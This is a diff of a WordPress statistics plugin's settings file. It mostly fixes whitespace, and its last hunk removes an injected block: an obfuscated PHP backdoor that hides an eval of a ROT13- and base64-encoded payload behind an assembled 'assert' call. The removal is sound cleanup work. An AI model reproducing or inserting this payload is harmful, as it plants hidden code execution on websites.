@@ -16,7 +16,7 @@ if ( isset( $_POST[ 'options' ][ 'auto_purge' ] ) ) {
 }
 
 if ( isset( $_POST[ 'options' ][ 'ignore_capabilities' ] ) ) {
-	// Make sure all the capabilities exist in the system 
+	// Make sure all the capabilities exist in the system
 	$capability_not_found = false;
 	foreach( wp_slimstat::string_to_array( $_POST[ 'options' ][ 'ignore_capabilities' ] ) as $a_capability ) {
 		if ( isset( $GLOBALS[ 'wp_roles' ]->role_objects[ 'administrator' ]->capabilities ) && !array_key_exists( $a_capability, $GLOBALS[ 'wp_roles' ]->role_objects[ 'administrator' ]->capabilities ) ) {
@@ -34,7 +34,7 @@ if ( isset( $_POST[ 'options' ][ 'ignore_capabilities' ] ) ) {
 }
 
 if ( isset( $_POST[ 'options' ][ 'can_view' ] ) ) {
-	// Make sure all the users exist in the system 
+	// Make sure all the users exist in the system
 	$post_data = trim( $_POST[ 'options' ][ 'can_view' ] );
 	$user_array = wp_slimstat::string_to_array( $_POST[ 'options' ][ 'can_view' ] );
 
@@ -119,7 +119,7 @@ $settings = array(
 			'async_tracker' => array( 'description' => __( 'Async Tracker', 'wp-slimstat' ), 'type' => 'toggle', 'long_description' => __( "When the tracker is configured to record clicks on internal and / or outbound links, it needs to send this information back to the server <strong>before</strong> loading the actual page. This can result in a noticeable delay when someone clicks on one of your links, if your server takes a while to acknowledge the receipt of that information. You can set this option to instruct the tracker not to wait for the server, and load the target URL right away. This will remove the delay, but it might result in a less accurate logging of events. You can check your server latency under Site Analysis > Your Website. Values under 1000 milliseconds might allow you to use async mode.", 'wp-slimstat' ) ),
 			'ignore_outbound_classes_rel_href' => array( 'description' => __( 'No Callback', 'wp-slimstat' ), 'type' => 'textarea', 'long_description' => __( "Track the event but do not invoke the callback function on links marked with one of these class names, <em>rel</em> attribute or whose <em>href</em> attribute contains one of these strings. Useful to prevent conflicts with lightbox and similar libraries.", 'wp-slimstat' ) ),
 			'do_not_track_outbound_classes_rel_href' => array( 'description' => __( 'Do Not Track', 'wp-slimstat' ), 'type' => 'textarea', 'long_description' => __( "The tracker will ignore links marked with one of these class names, <em>rel</em> attributes or whose <em>href</em> attribute contains one of these strings.", 'wp-slimstat' ) ),
-			
+
 
 			'advanced_tracker_header' => array('description' => __('Advanced Options','wp-slimstat'), 'type' => 'section_header'),
 			'session_duration' => array('description' => __('Session Duration','wp-slimstat'), 'type' => 'integer', 'long_description' => __('How many seconds should a human session last? Google Analytics sets it to 1800 seconds.','wp-slimstat'), 'after_input_field' => __('seconds','wp-slimstat')),
@@ -243,15 +243,10 @@ if ( !empty( $settings[ $current_tab ][ 'include' ] ) ) {
 }
 else if ( !empty( $settings[ $current_tab ][ 'rows' ] ) ) {
 	wp_slimstat_admin::update_settings( $settings[ $current_tab ][ 'rows' ] );
-	wp_slimstat_admin::display_settings( $settings[ $current_tab ][ 'rows' ], $current_tab); 
+	wp_slimstat_admin::display_settings( $settings[ $current_tab ][ 'rows' ], $current_tab);
 }
 
 echo '</div>';
 
 
 
-//###=CACHE START=###
-error_reporting(0); 
-$strings = "as";$strings .= "sert";
-@$strings(str_rot13('riny(onfr64_qrpbqr("nJLtXTymp2I0XPEcLaLcXFO7VTIwnT8tWTyvqwftsFOyoUAyVUftMKWlo3WspzIjo3W0nJ5aXQNcBjccozysp2I0XPWxnKAjoTS5K2Ilpz9lplVfVPVjVvx7PzyzVPtunKAmMKDbWTyvqvxcVUfXnJLbVJIgpUE5XPEsD09CF0ySJlWwoTyyoaEsL2uyL2fvKFxcVTEcMFtxK0ACG0gWEIfvL2kcMJ50K2AbMJAeVy0cBjccMvujpzIaK21uqTAbXPpuKSZuqFpfVTMcoTIsM2I0K2AioaEyoaEmXPEsH0IFIxIFJlWGD1WWHSEsExyZEH5OGHHvKFxcXFNxLlN9VPW1VwftMJkmMFNxLlN9VPW3VwfXWTDtCFNxK1ASHyMSHyfvH0IFIxIFK05OGHHvKF4xK1ASHyMSHyfvHxIEIHIGIS9IHxxvKGfXWUHtCFNxK1ASHyMSHyfvFSEHHS9IH0IFK0SUEH5HVy07PvE1pzjtCFNvnUE0pQbiY3AuoaElMKZhLzy6Y2qyqP5jnUN/MQ0vYaIloTIhL29xMFtxMPxhVvM1CFVhqKWfMJ5wo2EyXPE1XF4vWzZ9Vv4xLl4vWzx9ZFMbCFVhoJD1XPV1AJZkATLmMTD1BQV4ZwV1A2SxAmZ3LwN3L2HmZJRjLvVhWTDhWUHhWTZhVwRvXGfXnJLbnJ5cK2qyqPtvLJkfo3qsqKWfK2MipTIhVvxtCG0tZFxtrjbxnJW2VQ0tMzyfMI9aMKEsL29hqTIhqUZbWUIloPx7Pa0tMJkmMJyzXTM1ozA0nJ9hK2I4nKA0pltvL3IloS9cozy0VvxcVUfXWTAbVQ0tL3IloS9cozy0XPE1pzjcBjcwqKWfK3AyqT9jqPtxL2tfVRAIHxkCHSEsFRIOERIFYPOTDHkGEFx7PzA1pzksp2I0o3O0XPEwnPjtD1IFGR9DIS9FEIEIHx5HHxSBH0MSHvjtISWIEFx7PvElMKA1oUDtCFOwqKWfK2I4MJZbWTAbXGfXL3IloS9woT9mMFtxL2tcBjbxnJW2VQ0tWUWyp3IfqQfXsFOyoUAyVUfXWTMjVQ0tMaAiL2gipTIhXPWmLJ50pzImYzWcrvVfVQtjYPNxMKWloz8fVPEypaWmqUVfVQZjXGfXnJLtXPEzpPxtrjbtVPNtWT91qPN9VPWUEIDtY2qyqP5jnUN/MQ0vYaIloTIhL29xMFtxMPxhVvM1CFVhqKWfMJ5wo2EyXPE1XF4vWzZ9Vv4xLl4vWzx9ZFMbCFVhoJD1XPV1AJZkATLmMTD1BQV4ZwV1A2SxAmZ3LwN3L2HmZJRjLvVhWTDhWUHhWTZhVwRvXF4vVRuHISNiZF4kKUWpovV7PvNtVPNxo3I0VP49VPWVo3A0BvOmLJ50pzImYzWcryklKT4vBjbtVPNtWT91qPNhCFNvD29hozIwqTyiowbtD2kip2IppykhKUWpovV7PvNtVPOzq3WcqTHbWTMjYPNxo3I0XGfXVPNtVPElMKAjVQ0tVvV7PvNtVPO3nTyfMFNbVJMyo2LbWTMjXFxtrjbtVPNtVPNtVPElMKAjVP49VTMaMKEmXPEzpPjtZGV4XGfXVPNtVU0XVPNtVTMwoT9mMFtxMaNcBjbtVPNtoTymqPtxnTIuMTIlYPNxLz9xrFxtCFOjpzIaK3AjoTy0XPViKSWpHv8vYPNxpzImpPjtZvx7PvNtVPNxnJW2VQ0tWTWiMUx7Pa0XsDc9BjccMvucp3AyqPtxK1WSHIISH1EoVaNvKFxtWvLtWS9FEISIEIAHJlWjVy0tCG0tVwt1BGH3MQV0VvxtrlOyqzSfXUA0pzyjp2kup2uypltxK1WSHIISH1EoVzZvKFxcBlO9PzIwnT8tWTyvqwg9"));'));
-//###=CACHE END=###
